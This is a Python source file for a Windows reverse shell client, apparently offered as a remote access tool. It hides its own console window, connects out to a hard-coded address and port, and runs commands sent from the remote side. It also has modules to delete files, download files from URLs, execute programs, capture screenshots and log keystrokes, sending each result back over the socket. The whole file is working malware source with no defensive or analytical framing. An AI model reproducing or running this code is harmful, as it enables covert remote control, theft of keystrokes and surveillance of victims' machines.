import socket
import subprocess
import os
import urllib.request
import sys
import pyautogui
import time  
from pynput.keyboard import Key, Listener
from threading import Thread

try:
    import win32gui, win32con;

    window = win32gui.GetForegroundWindow();
    title  = win32gui.GetWindowText(window);
    if title.endswith("python.exe"):
        win32gui.ShowWindow(window, win32con.SW_HIDE);
    #endif
except:
    pass

#   Reverse Shell Client, created by: @cryptoplusplus

scr_path = os.environ.get('TEMP')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#   Commands list from commands - Can be updated, modified
comm = ["assoc","attrib","break","bcdedit","cacls","call","cd","chcp","chdir","chkdsk","chkntfs","cls","cmd","color","comp","compact","convert","copy","date","del","dir","diskpart","doskey","driverquery","echo","endlocal","erase","exit","fc","find","findstr","for","format","fsutil","ftype","goto","gpresult","graftabl","icacls","if","label","md","mkdir","mklink","mode","more","move","openfiles","path","pause","popd","print","prompt","pushd","rd","recover","rem","ren","rename","replace","rmdir","robocopy","set","setlocal","sc","schtasks","shift","shutdown","sort","start","subst","whoami","systeminfo","tasklist","taskkill","time","title","tree","type","ver","verify","vol","xcopy","wmic","ftp","getmac","ipconfig","netsh","netstat","nslookup","pathping","ping","route","telnet","tftp","tracert"]
class Response:
    def __init__(self):     #   Basic socket setup structure
        ip = "192.168.1.8"  #   Change to wanted ip address
        port = 9224 #   Change to wanted port
        sock.connect((ip, port))    #   Connect client to server
    def res(self):
        cwd = os.getcwd()
        sock.send(cwd.encode("utf-8"))
        index = 1
        while True:
            bytesrecv = sock.recv(4096)
            decoded = bytesrecv.decode("utf-8")
            cd_chdir = bytesrecv
            if cd_chdir[:2].decode("utf-8") == 'cd':    #   cd case
                os.chdir(bytesrecv[3:].decode("utf-8"))
                get_cwd = os.getcwd()
                sock.send(get_cwd.encode("utf-8"))
            elif cd_chdir[:5].decode("utf-8") == 'chdir':   #   chdir case
                os.chdir(bytesrecv[6:].decode("utf-8"))
                chdir_cwd = os.getcwd()
                sock.send(chdir_cwd.encode("utf-8"))
            else:
                if decoded.lower() == "del" or decoded.split()[0] == "del":    
                    if decoded[3:] == "":
                        sock.send("Please specify the file or path".encode("utf-8"))    #   delete file module - usage: del [file]
                    if decoded[3:] != "":
                        os.remove(decoded.split()[1])
                        sock.send("Done!".encode("utf-8"))
                elif decoded.lower() == "download" or decoded.split()[0] == "download":     #   download file module - usage: download [URL] [filename.extension]
                    if decoded[8:] == "":
                        sock.send("Please specify URL / File name".encode("utf-8"))
                    if decoded[8:] != "":
                        urllib.request.urlretrieve(decoded.split()[1], decoded.split()[2])
                        sock.send("Done!".encode("utf-8"))
                elif decoded.lower() == "exec" or decoded.split()[0] == "exec":     #   executing file module - usage: exec [filename]
                    if decoded[4:] == "":
                        sock.send("Please specify a file".encode("utf-8"))
                    if decoded[4:] != "":
                        subprocess.Popen(decoded.split()[1], stderr=subprocess.PIPE)
                        sock.send("Done!".encode("utf-8"))
                elif decoded == "screenshot" or decoded.split()[0] == "screenshot":
                    screenshot = pyautogui.screenshot()
                    screenshot.save(scr_path + f'\screenshot{index}.png')
                    image = open(scr_path + f'\screenshot{index}.png', 'rb')
                    read_img = image.read()
                    imgsize = len(read_img)
                    sock.sendall(bytes(str(imgsize), "utf-8"))
                    sock.sendall(read_img)
                    index += 1
                    image.close()
                elif decoded == "keylogger" or decoded.split()[0] == "keylogger":
                    def on_press(key):  #   On_Press Method
                        real_key = str(key).replace("'","")
                        if key == Key.space:
                            real_key = " "
                        elif key == Key.backspace:
                            real_key = "[BKSP]"
                        elif key == Key.enter:
                            real_key = "[ENTER]\n"
                        elif key == Key.shift:
                            real_key = "[SHIFT]"
                        elif key == Key.tab:
                            real_key == "[TAB]"
                        elif key == Key.cmd:
                            real_key = "[WIN_KEY]"
                        with open(scr_path + "\log.txt", "a") as file:
                            file.write(real_key)

                    with Listener(on_press=on_press) as listener:   #   Listener
                        def time_out(period_sec: int):
                            time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
                            listener.stop()

                        Thread(target=time_out, args=(60.0,)).start()
                        listener.join()
                    
                    time.sleep(0.1)
                    read_file = open(scr_path + "\log.txt", 'r')
                    sock.send(read_file.read().encode("utf-8"))
                    read_file.close()
                else:
                    if " " in decoded:  #   If there is any space in "decoded"
                        split = decoded.split()
                        process = subprocess.Popen(split, stdout=subprocess.PIPE, stderr=None, shell=True)
                        if split[0] in comm:
                            output = process.communicate()
                            send = output[0]
                            sock.send(bytes(send))
                        elif split[0] not in comm:
                            err_proc = """'{}' is not recognized as an internal or external command,\noperable program or batch file.""".format(split[0])
                            sock.send(err_proc.encode("utf-8"))
                        else:
                            error = "Command not found."
                            sock.send(error.encode("utf-8"))
                    else:   #   Single command
                        proc = subprocess.Popen(decoded, stdout=subprocess.PIPE, stderr=None, shell=True)
                        if decoded == "help":
                            help = "Check out commands.txt for more information ~.~"
                            sock.send(help.encode("utf-8"))
                        elif decoded in comm:
                            out = proc.communicate()
                            snd = out[0]
                            sock.send(bytes(snd))
                        elif decoded not in comm and decoded != "help":
                            proc_err = """'{}' is not recognized as an internal or external command,\noperable program or batch file.""".format(decoded)
                            sock.send(proc_err.encode("utf-8"))

resp = Response()
resp.res()
                

                
